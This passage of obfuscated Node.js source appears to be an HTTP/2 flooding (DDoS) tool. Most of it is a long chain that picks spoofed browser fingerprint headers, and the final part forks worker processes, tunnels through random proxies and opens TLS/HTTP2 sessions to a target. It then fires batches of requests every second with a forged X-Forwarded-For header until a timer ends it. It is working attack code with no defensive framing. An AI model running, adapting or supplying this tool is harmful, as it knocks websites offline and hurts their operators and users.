                          sec2 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';
                          sec3 = 'Linux';
                          sec4 = '114.0.0.0';
                          sec5 = '10.0';
                          sec6 = '" Not;A Brand";v="56.0.0.0", "Google Chrome";v="114.0.0.0", "Chromium";v="114.0.0.0"';
                          sec7 = 'document';
                          sec8 = 'navigate';
                          sec9 = 'same-origin';
                        } else {
                          if (OnlyTRis4da69c === 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36') {
                            sec1 = '" Not;A Brand";v="53", "Google Chrome";v="113", "Chromium";v="113"';
                            sec2 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36';
                            sec3 = 'Linux';
                            sec4 = '113.0.0.0';
                            sec5 = '10.0';
                            sec6 = '" Not;A Brand";v="53.0.0.0", "Google Chrome";v="115.0.0.0", "Chromium";v="115.0.0.0"';
                            sec7 = 'document';
                            sec8 = 'navigate';
                            sec9 = 'same-origin';
                          } else {
                            if (OnlyTRis4da69c === 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36') {
                              sec1 = '" Not;A Brand";v="49", "Google Chrome";v="112", "Chromium";v="112"';
                              sec2 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36';
                              sec3 = 'Linux';
                              sec4 = '112.0.0.0';
                              sec5 = '10.0';
                              sec6 = '" Not;A Brand";v="49.0.0.0", "Google Chrome";v="112.0.0.0", "Chromium";v="112.0.0.0"';
                              sec7 = 'document';
                              sec8 = 'navigate';
                              sec9 = 'same-origin';
                            } else {
                              if (OnlyTRis4da69c === 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36') {
                                sec1 = '" Not;A Brand";v="69", "Google Chrome";v="111", "Chromium";v="111"';
                                sec2 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36';
                                sec3 = 'Linux';
                                sec4 = '111.0.0.0';
                                sec5 = '10.0';
                                sec6 = '" Not;A Brand";v="69.0.0.0", "Google Chrome";v="111.0.0.0", "Chromium";v="111.0.0.0"';
                                sec7 = 'document';
                                sec8 = 'navigate';
                                sec9 = 'same-origin';
                              } else {
                                if (OnlyTRis4da69c === 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36') {
                                  sec1 = '" Not;A Brand";v="65", "Google Chrome";v="110", "Chromium";v="110"';
                                  sec2 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36';
                                  sec3 = 'Linux';
                                  sec4 = '110.0.0.0';
                                  sec5 = '10.0';
                                  sec6 = '" Not;A Brand";v="65.0.0.0", "Google Chrome";v="110.0.0.0", "Chromium";v="110.0.0.0"';
                                  sec7 = 'document';
                                  sec8 = 'navigate';
                                  sec9 = 'same-origin';
                                } else {
                                  if (OnlyTRis4da69c === 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36') {
                                    sec1 = '" Not;A Brand";v="43", "Google Chrome";v="109", "Chromium";v="109"';
                                    sec2 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
                                    sec3 = 'Linux';
                                    sec4 = '109.0.0.0';
                                    sec5 = '10.0';
                                    sec6 = '" Not;A Brand";v="43.0.0.0", "Google Chrome";v="109.0.0.0", "Chromium";v="109.0.0.0"';
                                    sec7 = 'document';
                                    sec8 = 'navigate';
                                    sec9 = 'same-origin';
                                  } else {
                                    if (OnlyTRis4da69c === 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36') {
                                      sec1 = '" Not;A Brand";v="34", "Google Chrome";v="108", "Chromium";v="108"';
                                      sec2 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36';
                                      sec3 = 'Linux';
                                      sec4 = '108.0.0.0';
                                      sec5 = '10.0';
                                      sec6 = '" Not;A Brand";v="34.0.0.0", "Google Chrome";v="108.0.0.0", "Chromium";v="108.0.0.0"';
                                      sec7 = 'document';
                                      sec8 = 'navigate';
                                      sec9 = 'same-origin';
                                    } else {
                                      if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36') {
                                        sec1 = '" Not;A Brand";v="33", "Google Chrome";v="115", "Chromium";v="115"';
                                        sec2 = 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36';
                                        sec3 = 'Windows';
                                        sec4 = '115.0.0.0';
                                        sec5 = '6.3';
                                        sec6 = '" Not;A Brand";v="33.0.0.0", "Google Chrome";v="115.0.0.0", "Chromium";v="115.0.0.0"';
                                        sec7 = 'document';
                                        sec8 = 'navigate';
                                        sec9 = 'same-origin';
                                      } else {
                                        if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36') {
                                          sec1 = '"Chromium";v="116", " Not A;Brand";v="52", "Google Chrome";v="116"';
                                          sec2 = 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36';
                                          sec3 = 'Windows';
                                          sec4 = '116.0.0.0';
                                          sec5 = '6.3';
                                          sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="52.0.0.0", "Google Chrome";v="116.0.0.0"';
                                          sec7 = 'document';
                                          sec8 = 'navigate';
                                          sec9 = 'same-origin';
                                        } else {
                                          if (OnlyTRis4da69c === 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36') {
                                            sec1 = '"Chromium";v="116", " Not A;Brand";v="89", "Google Chrome";v="116"';
                                            sec2 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36';
                                            sec3 = 'Mac OS X';
                                            sec4 = '116.0.0.0';
                                            sec5 = '10_15_0';
                                            sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="89.0.0.0", "Google Chrome";v="116.0.0.0"';
                                            sec7 = 'document';
                                            sec8 = 'navigate';
                                            sec9 = 'same-origin';
                                          } else {
                                            if (OnlyTRis4da69c === 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36') {
                                              sec1 = '"Chromium";v="115", " Not A;Brand";v="79", "Google Chrome";v="115"';
                                              sec2 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36';
                                              sec3 = 'Mac OS X';
                                              sec4 = '115.0.0.0';
                                              sec5 = '10_15_0';
                                              sec6 = '"Chromium";v="115.0.0.0", " Not A;Brand";v="79.0.0.0", "Google Chrome";v="115.0.0.0"';
                                              sec7 = 'document';
                                              sec8 = 'navigate';
                                              sec9 = 'same-origin';
                                            } else {
                                              if (OnlyTRis4da69c === 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36') {
                                                sec1 = '"Chromium";v="114", " Not A;Brand";v="19", "Google Chrome";v="114"';
                                                sec2 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';
                                                sec3 = 'Mac OS X';
                                                sec4 = '114.0.0.0';
                                                sec5 = '10_15_0';
                                                sec6 = '"Chromium";v="114.0.0.0", " Not A;Brand";v="19.0.0.0", "Google Chrome";v="114.0.0.0"';
                                                sec7 = 'document';
                                                sec8 = 'navigate';
                                                sec9 = 'same-origin';
                                              } else {
                                                if (OnlyTRis4da69c === 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36') {
                                                  sec1 = '"Chromium";v="113", " Not A;Brand";v="29", "Google Chrome";v="113"';
                                                  sec2 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36';
                                                  sec3 = 'Mac OS X';
                                                  sec4 = '113.0.0.0';
                                                  sec5 = '10_15_0';
                                                  sec6 = '"Chromium";v="113.0.0.0", " Not A;Brand";v="29.0.0.0", "Google Chrome";v="113.0.0.0"';
                                                  sec7 = 'document';
                                                  sec8 = 'navigate';
                                                  sec9 = 'same-origin';
                                                } else {
                                                  if (OnlyTRis4da69c === 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36') {
                                                    sec1 = '"Chromium";v="116", " Not A;Brand";v="59", "Google Chrome";v="116"';
                                                    sec2 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36';
                                                    sec3 = 'Mac OS X';
                                                    sec4 = '116.0.0.0';
                                                    sec5 = '13_5_1';
                                                    sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="59.0.0.0", "Google Chrome";v="116.0.0.0"';
                                                    sec7 = 'document';
                                                    sec8 = 'navigate';
                                                    sec9 = 'same-origin';
                                                  } else {
                                                    if (OnlyTRis4da69c === 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36') {
                                                      sec1 = '"Chromium";v="115", " Not A;Brand";v="91", "Google Chrome";v="115"';
                                                      sec2 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36';
                                                      sec3 = 'Mac OS X';
                                                      sec4 = '115.0.0.0';
                                                      sec5 = '13_5_1';
                                                      sec6 = '"Chromium";v="115.0.0.0", " Not A;Brand";v="91.0.0.0", "Google Chrome";v="115.0.0.0"';
                                                      sec7 = 'document';
                                                      sec8 = 'navigate';
                                                      sec9 = 'same-origin';
                                                    } else {
                                                      if (OnlyTRis4da69c === 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36') {
                                                        sec1 = '"Chromium";v="114", " Not A;Brand";v="92", "Google Chrome";v="114"';
                                                        sec2 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';
                                                        sec3 = 'Mac OS X';
                                                        sec4 = '114.0.0.0';
                                                        sec5 = '13_5_1';
                                                        sec6 = '"Chromium";v="114.0.0.0", " Not A;Brand";v="92.0.0.0", "Google Chrome";v="114.0.0.0"';
                                                        sec7 = 'document';
                                                        sec8 = 'navigate';
                                                        sec9 = 'same-origin';
                                                      } else {
                                                        if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0') {
                                                          sec1 = '"Chromium";v="116", " Not A;Brand";v="97", "Google Chrome";v="116"';
                                                          sec2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0';
                                                          sec3 = 'Windows';
                                                          sec4 = '116.0.0.0';
                                                          sec5 = '10.0';
                                                          sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="97.0.0.0", "Google Chrome";v="116.0.0.0"';
                                                          sec7 = 'document';
                                                          sec8 = 'navigate';
                                                          sec9 = 'same-origin';
                                                        } else {
                                                          if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0') {
                                                            sec1 = '"Chromium";v="111", " Not A;Brand";v="82", "Google Chrome";v="111"';
                                                            sec2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0';
                                                            sec3 = 'Windows';
                                                            sec4 = '111.0.0.0';
                                                            sec5 = '10.0';
                                                            sec6 = '"Chromium";v="111.0.0.0", " Not A;Brand";v="82.0.0.0", "Google Chrome";v="111.0.0.0"';
                                                            sec7 = 'document';
                                                            sec8 = 'navigate';
                                                            sec9 = 'same-origin';
                                                          } else {
                                                            if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0') {
                                                              sec1 = '"Chromium";v="110", " Not A;Brand";v="49", "Google Chrome";v="110"';
                                                              sec2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0';
                                                              sec3 = 'Windows';
                                                              sec4 = '110.0.0.0';
                                                              sec5 = '10.0';
                                                              sec6 = '"Chromium";v="110.0.0.0", " Not A;Brand";v="49.0.0.0", "Google Chrome";v="110.0.0.0"';
                                                              sec7 = 'document';
                                                              sec8 = 'navigate';
                                                              sec9 = 'same-origin';
                                                            } else {
                                                              if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0') {
                                                                sec1 = '"Chromium";v="109", " Not A;Brand";v="38", "Google Chrome";v="109"';
                                                                sec2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0';
                                                                sec3 = 'Windows';
                                                                sec4 = '109.0.0.0';
                                                                sec5 = '10.0';
                                                                sec6 = '"Chromium";v="109.0.0.0", " Not A;Brand";v="38.0.0.0", "Google Chrome";v="109.0.0.0"';
                                                                sec7 = 'document';
                                                                sec8 = 'navigate';
                                                                sec9 = 'same-origin';
                                                              } else {
                                                                if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0') {
                                                                  sec1 = '"Chromium";v="108", " Not A;Brand";v="28", "Google Chrome";v="108"';
                                                                  sec2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0';
                                                                  sec3 = 'Windows';
                                                                  sec4 = '108.0.0.0';
                                                                  sec5 = '10.0';
                                                                  sec6 = '"Chromium";v="108.0.0.0", " Not A;Brand";v="28.0.0.0", "Google Chrome";v="108.0.0.0"';
                                                                  sec7 = 'document';
                                                                  sec8 = 'navigate';
                                                                  sec9 = 'same-origin';
                                                                } else {
                                                                  if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0') {
                                                                    sec1 = '"Chromium";v="107", " Not A;Brand";v="96", "Google Chrome";v="107"';
                                                                    sec2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0';
                                                                    sec3 = 'Windows';
                                                                    sec4 = '107.0.0.0';
                                                                    sec5 = '10.0';
                                                                    sec6 = '"Chromium";v="107.0.0.0", " Not A;Brand";v="96.0.0.0", "Google Chrome";v="107.0.0.0"';
                                                                    sec7 = 'document';
                                                                    sec8 = 'navigate';
                                                                    sec9 = 'same-origin';
                                                                  } else {
                                                                    if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0') {
                                                                      sec1 = '"Chromium";v="106", " Not A;Brand";v="8", "Google Chrome";v="106"';
                                                                      sec2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0';
                                                                      sec3 = 'Windows';
                                                                      sec4 = '106.0.0.0';
                                                                      sec5 = '10.0';
                                                                      sec6 = '"Chromium";v="106.0.0.0", " Not A;Brand";v="8.0.0.0", "Google Chrome";v="106.0.0.0"';
                                                                      sec7 = 'document';
                                                                      sec8 = 'navigate';
                                                                      sec9 = 'same-origin';
                                                                    } else {
                                                                      if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0') {
                                                                        const OnlyTRis284062 = '5|0|8|6|4|2|1|3|7'['split']('|');
                                                                        letOnlyTRis431416 = 0;
                                                                        while (true) {
                                                                          switch (OnlyTRis284062[OnlyTRis431416++]) {
                                                                            case '0':
                                                                              sec2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0';
                                                                              continue;
                                                                            case '1':
                                                                              sec7 = 'document';
                                                                              continue;
                                                                            case '2':
                                                                              sec6 = '"Chromium";v="110.0.0.0", " Not A;Brand";v="16.0.0.0", "Google Chrome";v="110.0.0.0"';
                                                                              continue;
                                                                            case '3':
                                                                              sec8 = 'navigate';
                                                                              continue;
                                                                            case '4':
                                                                              sec5 = '10.0';
                                                                              continue;
                                                                            case '5':
                                                                              sec1 = '"Chromium";v="105", " Not A;Brand";v="16", "Google Chrome";v="105"';
                                                                              continue;
                                                                            case '6':
                                                                              sec4 = '105.0.0.0';
                                                                              continue;
                                                                            case '7':
                                                                              sec9 = 'same-origin';
                                                                              continue;
                                                                            case '8':
                                                                              sec3 = 'Windows';
                                                                              continue;
                                                                          }
                                                                          break;
                                                                        }
                                                                      } else {
                                                                        if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0') {
                                                                          sec1 = '"Chromium";v="105", " Not A;Brand";v="24", "Google Chrome";v="105"';
                                                                          sec2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0';
                                                                          sec3 = 'Windows';
                                                                          sec4 = '105.0.0.0';
                                                                          sec5 = '10.0';
                                                                          sec6 = '"Chromium";v="105.0.0.0", " Not A;Brand";v="24.0.0.0", "Google Chrome";v="105.0.0.0"';
                                                                          sec7 = 'document';
                                                                          sec8 = 'navigate';
                                                                          sec9 = 'same-origin';
                                                                        } else {
                                                                          sec1 = '"Chromium";v="115", " Not A;Brand";v="26", "Google Chrome";v="115"';
                                                                          sec2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0';
                                                                          sec3 = 'Windows';
                                                                          sec4 = '115.0.0.0';
                                                                          sec5 = '10.0';
                                                                          sec6 = '"Chromium";v="115.0.0.0", " Not A;Brand";v="26.0.0.0", "Google Chrome";v="115.0.0.0"';
                                                                          sec7 = 'document';
                                                                          sec8 = 'navigate';
                                                                          sec9 = 'same-origin';
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
setInterval(() => {
  updateSecValues();
}, 1), updateSecValues();
if (cluster['isMaster']) for (let counter = 1; counter <= args['threads']; counter++) {
  cluster['fork']();
} else setInterval(runFlooder);
class NetSocket {
  constructor() {}
  ['HTTP'](OnlyTRis3abf76, _0x14c875) {
    const OnlyTRis461dbc = OnlyTRis3abf76['address']['split'](':'),
      OnlyTRis129b66 = OnlyTRis461dbc[0],
      _0x1072d2 = 'CONNECT ' + OnlyTRis3abf76['address'] + ':443 HTTP/1.1\r\nHost: ' + OnlyTRis3abf76['address'] + ':443\r\nConnection: Keep-Alive\r\n\r\n',
      _0x255d11 = new Buffer['from'](_0x1072d2),
      OnlyTRis20ba28 = net['connect']({
        'host': OnlyTRis3abf76['host'],
        'port': OnlyTRis3abf76['port']
      });
    OnlyTRis20ba28['setTimeout'](OnlyTRis3abf76['timeout'] * 600000), OnlyTRis20ba28['setKeepAlive'](true, 100000), OnlyTRis20ba28['on']('connect', () => {
      OnlyTRis20ba28['write'](_0x255d11);
    }), OnlyTRis20ba28['on']('data', OnlyTRis31004d => {
      const OnlyTRis33d918 = OnlyTRis31004d['toString']('utf-8'),
        OnlyTRis1c2e10 = OnlyTRis33d918['includes']('HTTP/1.1 200');
      if (OnlyTRis1c2e10 === false) return OnlyTRis20ba28['destroy'](), _0x14c875(undefined, 'error: invalid response from proxy server');
      return _0x14c875(OnlyTRis20ba28, undefined);
    }), OnlyTRis20ba28['on']('timeout', () => {
      return OnlyTRis20ba28['destroy'](), _0x14c875(undefined, 'error: timeout exceeded');
    }), OnlyTRis20ba28['on']('error', OnlyTRisb1066f => {
      return OnlyTRis20ba28['destroy'](), _0x14c875(undefined, 'error: ' + OnlyTRisb1066f);
    });
  }
}
const Socker = new NetSocket();
headers[':method'] = 'GET', headers[':authority'] = parsedTarget['host'], headers[':scheme'] = 'https', headers['x-forwarded-proto'] = 'https', headers[':path'] = parsedTarget['path'], headers['accept-encoding'] = encoding, headers['X-Forwarded-For'] = spoofed, headers['sec-ch-ua'] = sec1, headers['sec-gpc'] = '1', headers['sec-ch-ua-mobile'] = '?0', headers['sec-ch-ua-full-version'] = sec4, headers['sec-ch-ua-full-version-list'] = sec6, headers['sec-ch-ua-arch'] = 'x86', headers['sec-ch-ua-bitness'] = '64', headers['DNT'] = '1', headers['sec-ch-ua-platform'] = sec3, headers['sec-ch-ua-platform-version'] = sec5, headers['upgrade-insecure-requests'] = '1', headers['accept'] = accept, headers['user-agent'] = sec2, headers['accept-language'] = lang, headers['sec-fetch-mode'] = sec8, headers['sec-fetch-dest'] = sec7, headers['sec-fetch-user'] = '?1', headers['pragma'] = 'no-cache', headers['sec-fetch-site'] = sec9, headers.te = 'trailers', headers['x-requested-with'] = 'XMLHttpRequest';
function runFlooder() {
  const _0x55138c = randomElement(proxies),
    OnlyTRis2f0804 = _0x55138c['split'](':'),
    OnlyTRis4f1e28 = {
      'host': OnlyTRis2f0804[0],
      'port': ~~OnlyTRis2f0804[1],
      'address': parsedTarget['host'] + ':443',
      'timeout': 0x64
    };
  Socker['HTTP'](OnlyTRis4f1e28, (OnlyTRis393e71, _0x4c5c18) => {
    if (_0x4c5c18) return;
    OnlyTRis393e71['setKeepAlive'](true, 600000);
    const _0x27c0b4 = {
        'host': parsedTarget['host'],
        'secure': true,
        'ALPNProtocols': ['h2'],
        'sigals': siga,
        'socket': OnlyTRis393e71,
        'ecdhCurve': 'prime256v1:X25519',
        'ciphers': cipper,
        'host': parsedTarget['host'],
        'rejectUnauthorized': false,
        'servername': parsedTarget['host'],
        'secureProtocol': 'TLS_method'
      },
      OnlyTRis25353b = tls['connect'](443, parsedTarget['host'], _0x27c0b4);
    OnlyTRis25353b['setKeepAlive'](true, 60000);
    const OnlyTRis23d46d = http2['connect'](parsedTarget['href'], {
      'protocol': 'https:',
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x7d0,
        'initialWindowSize': 0x600000,
        'maxHeaderListSize': 0x10000,
        'enablePush': false
      },
      'maxSessionMemory': 0xd05,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => OnlyTRis25353b,
      'socket': OnlyTRis393e71
    });
    OnlyTRis23d46d['settings']({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x7d0,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x10000,
      'enablePush': false
    }), OnlyTRis23d46d['on']('connect', () => {
      const OnlyTRis120090 = setInterval(() => {
        const OnlyTRis2245d7 = {
          ...headers,
          ...rateHeaders2[Math['floor'](Math['random']() * rateHeaders['length'])],
          ...rateHeaders[Math['floor'](Math['random']() * rateHeaders['length'])]
        };
        for (let OnlyTRisa1a501 = 0; OnlyTRisa1a501 < args['Rate']; OnlyTRisa1a501++) {
          const OnlyTRis435767 = OnlyTRis23d46d['request'](OnlyTRis2245d7);
          OnlyTRis23d46d['on']('response', OnlyTRis431174 => {
            OnlyTRis435767['close'](), OnlyTRis435767['destroy']();
            return;
          }), OnlyTRis435767['end']();
        }
      }, 1000);
    }), OnlyTRis23d46d['on']('close', () => {
      OnlyTRis23d46d['destroy'](), OnlyTRis393e71['destroy']();
      return;
    });
  }), function (OnlyTRis4ae95c, OnlyTRis72d407, OnlyTRis4b36bb) {};
}
const KillScript = () => process['exit'](1);
setTimeout(KillScript, args['time'] * 1000);